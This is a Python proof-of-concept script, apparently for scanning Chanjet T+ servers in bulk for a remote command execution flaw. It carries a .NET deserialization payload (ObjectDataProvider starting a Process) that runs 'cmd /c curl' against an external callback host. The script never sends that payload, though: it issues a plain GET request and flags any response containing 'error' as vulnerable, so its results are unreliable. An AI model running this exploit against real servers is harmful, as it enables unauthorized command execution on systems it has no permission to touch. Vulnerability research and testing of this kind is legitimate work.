import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
from colorama import init
from colorama import Fore

def main():
    '''主函数'''
    banner()            
    parser = argparse.ArgumentParser(description = '畅捷通T+ Ufida.T.DI.UIP.RRA.RRATableController 远程命令执行漏洞')    #实例化对象
    parser.add_argument('-u','--url',help='请输入你要判断的url')        #添加变量，参数
    parser.add_argument('-f','--file',help='请输入你要批量的url')       #添加变量，参数
    agres = parser.parse_args()                                     #实例化
    if agres.url and not agres.file:                        #判断url和文件
        poc(agres.url)                              #如果是url就调用poc
    elif agres.file and not agres.url:              #判断url和文件     
        url_list = []                             #定义列表
        with open (agres.file,'r',encoding='utf-8') as fp:  #以读的方式，utp-8编码打开文件
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     #首尾去空
        mp = Pool(100)                      #定义线程数100
        mp.map(poc, url_list)               #定义线程数
        mp.close()                          #关闭
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')              #f 格式化输出 usag 用法 \t 制表符   sys.argv[0] 获取脚本文件名

def banner():
    '''横幅'''
    test = """                                                                                                                        
       

 /$$$$$$$$              /$$   /$$  /$$$$$$  /$$       /$$            /$$$$$$$$  /$$$$$$$  /$$$$$$     /$$   /$$ /$$$$$$ /$$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$      /$$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$$$        /$$       /$$            /$$$$$$                        /$$                         /$$ /$$                    
|__  $$__/ /$$         | $$  | $$ /$$__  $$|__/      | $$           |__  $$__/ | $$__  $$|_  $$_/    | $$  | $$|_  $$_/| $$__  $$| $$__  $$| $$__  $$ /$$__  $$    | $$__  $$| $$__  $$ /$$__  $$|__  $$__/       | $$      | $$           /$$__  $$                      | $$                        | $$| $$                    
   | $$   | $$         | $$  | $$| $$  \__/ /$$  /$$$$$$$  /$$$$$$     | $$    | $$  \ $$  | $$      | $$  | $$  | $$  | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$    | $$  \ $$| $$  \ $$| $$  \ $$   | $$  /$$$$$$ | $$$$$$$ | $$  /$$$$$$ | $$  \__/  /$$$$$$  /$$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$ | $$| $$  /$$$$$$   /$$$$$$ 
   | $$ /$$$$$$$$      | $$  | $$| $$$$    | $$ /$$__  $$ |____  $$    | $$    | $$  | $$  | $$      | $$  | $$  | $$  | $$$$$$$/| $$$$$$$/| $$$$$$$/| $$$$$$$$    | $$$$$$$/| $$$$$$$/| $$$$$$$$   | $$ |____  $$| $$__  $$| $$ /$$__  $$| $$       /$$__  $$| $$__  $$|_  $$_/   /$$__  $$ /$$__  $$| $$| $$ /$$__  $$ /$$__  $$
   | $$|__  $$__/      | $$  | $$| $$_/    | $$| $$  | $$  /$$$$$$$    | $$    | $$  | $$  | $$      | $$  | $$  | $$  | $$____/ | $$__  $$| $$__  $$| $$__  $$    | $$__  $$| $$__  $$| $$__  $$   | $$  /$$$$$$$| $$  \ $$| $$| $$$$$$$$| $$      | $$  \ $$| $$  \ $$  | $$    | $$  \__/| $$  \ $$| $$| $$| $$$$$$$$| $$  \__/
   | $$   | $$         | $$  | $$| $$      | $$| $$  | $$ /$$__  $$    | $$    | $$  | $$  | $$      | $$  | $$  | $$  | $$      | $$  \ $$| $$  \ $$| $$  | $$    | $$  \ $$| $$  \ $$| $$  | $$   | $$ /$$__  $$| $$  | $$| $$| $$_____/| $$    $$| $$  | $$| $$  | $$  | $$ /$$| $$      | $$  | $$| $$| $$| $$_____/| $$      
   | $$   |__/         |  $$$$$$/| $$      | $$|  $$$$$$$|  $$$$$$$ /$$| $$ /$$| $$$$$$$/ /$$$$$$ /$$|  $$$$$$/ /$$$$$$| $$ /$$  | $$  | $$| $$  | $$| $$  | $$ /$$| $$  | $$| $$  | $$| $$  | $$   | $$|  $$$$$$$| $$$$$$$/| $$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$  |  $$$$/| $$      |  $$$$$$/| $$| $$|  $$$$$$$| $$      
   |__/                 \______/ |__/      |__/ \_______/ \_______/|__/|__/|__/|_______/ |______/|__/ \______/ |______/|__/|__/  |__/  |__/|__/  |__/|__/  |__/|__/|__/  |__/|__/  |__/|__/  |__/   |__/ \_______/|_______/ |__/ \_______/ \______/  \______/ |__/  |__/   \___/  |__/       \______/ |__/|__/ \_______/|__/      
                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                  

                                                        
                                                                                                                                                                                                                                                                                                    version: 1.0.0
                                                                                                                                                                                                                                                                                                    author:sis2311@lsk

"""
    print(test)             #打印test


def poc(target):
    '''检测漏洞'''
    url = target + '/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore'
    headers ={
           'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
            'Content-Type': 'application/json',
    }
    data='''
        "storeID":{\n\r"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",\n\r"MethodName":"Start",\n\r"ObjectInstance":{\n\r"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",\n\r"StartInfo": {\n\r"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",\n\r"FileName":"cmd", "Arguments":"/c curl bb1212.qztayuf3yg90msrteh9oy50o5fb6zwnl.oastify.com"\n\r}\n\r}\n\r}\n\r}
        '''
    try:
        result = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'error' in result:
            print(Fore.GREEN + f'[+] 存在漏洞 {target} '+'\n')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(Fore.GREEN + f'[+] 存在漏洞 {target} '+'\n')
        else:
            print(Fore.RED +f'[-]{target} is not vulabe')
    except:
        print(Fore.RED +f'[*]{target} server error')

'''检测漏洞脚本'''
if __name__ == '__main__':
    '''定义主函数'''
    main()